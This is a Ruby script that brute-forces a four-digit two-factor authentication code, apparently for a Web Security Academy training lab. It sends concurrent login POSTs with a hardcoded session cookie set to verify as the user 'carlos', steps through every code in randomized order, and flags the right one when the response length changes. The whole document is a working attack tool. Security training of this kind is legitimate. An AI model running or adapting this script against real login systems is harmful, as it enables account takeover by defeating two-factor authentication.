require 'bundler/inline'

gemfile do
  source 'https://rubygems.org'
  gem 'async-http'
end

require 'async'
require 'async/semaphore'
require 'async/barrier'
require 'async/http/internet'

class Bruteforcer
  def initialize(digits: 4)
    @digits = digits
    @end = 10 ** @digits
    @first_pick = rand(0..@end-1)
    @current = @first_pick
  end

  # An iterator that follows the `Linear Congruential Generator` algorithm.
  #
  # For more information: https://en.wikipedia.org/wiki/Linear_congruential_generator
  def each(&block)
    loop do
      code = "%0#{@digits}d" % @current
      block.call(code)

      @current = (@current + step) % @end
      break if @current == @first_pick
    end
  end

  private

  def step
    @step ||= pick_random_coprime(@end);
  end

  # The probability that two random integers are coprime to one another
  # works out to be around 61%, given that we can safely pick a random
  # number and test it. Just in case we are having a bad day and we cannot
  # pick a coprime number after 10 tries we just return "end - 1" which
  # is guaranteed to be a coprime, but won't provide ideal randomization.
  #
  # We pick between "lower_range" and "upper_range" since values too close to
  # the boundaries, which in these case are the "start" and "end" arguments
  # would also provide non-ideal randomization as discussed on the paragraph
  # above.
  def pick_random_coprime(max)
    range_boundary = max / 4;
    lower_range = range_boundary;
    upper_range = max - range_boundary;
    candidate = rand(lower_range..upper_range);

    (0..10).each do |_|
      if max.gcd(candidate) == 1
        return candidate;
      else
        candidate = rand(lower_range..upper_range);
      end
    end

    max - 1
  end
end

class Connection
  def initialize(internet, url, headers)
    @internet = internet
    @url = url
    @headers = headers
  end

  def perform(body)
    response = @internet.post(@url, @headers, body)
    response.read.size
  end
end

Async do |bruteforce_task|
	internet = Async::HTTP::Internet.new
	barrier = Async::Barrier.new
	semaphore = Async::Semaphore.new(4, parent: barrier)

  url = 'https://acf31f871e620d29805acb25003a0063.web-security-academy.net/login2'
  headers = [
    ['Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'],
    ['Cache-Control', 'no-cache'],
    ['Cookie', 'session=qVXwYoofiSbp14qEsbYJMmH1DBI3eItq; verify=carlos'],
    ['Content-Type', 'application/x-www-form-urlencoded'],
  ]
  connection = Connection.new(internet, url, headers)

  # Perform a request with the wrong code in order to obtain the response body length
  # of an invalid request.
  invalid_response_size = connection.perform("mfa-code=abcd")

  Bruteforcer.new(digits: 4).each do |code|
    semaphore.async do
      body = "mfa-code=#{code}"
      response_size = connection.perform(body)

      if response_size != invalid_response_size
        puts "\n\nValid code found: #{code}\n\n"
        bruteforce_task.stop
      else
        print '.'
      end
    end
  end

	barrier.wait
ensure
	internet&.close
end
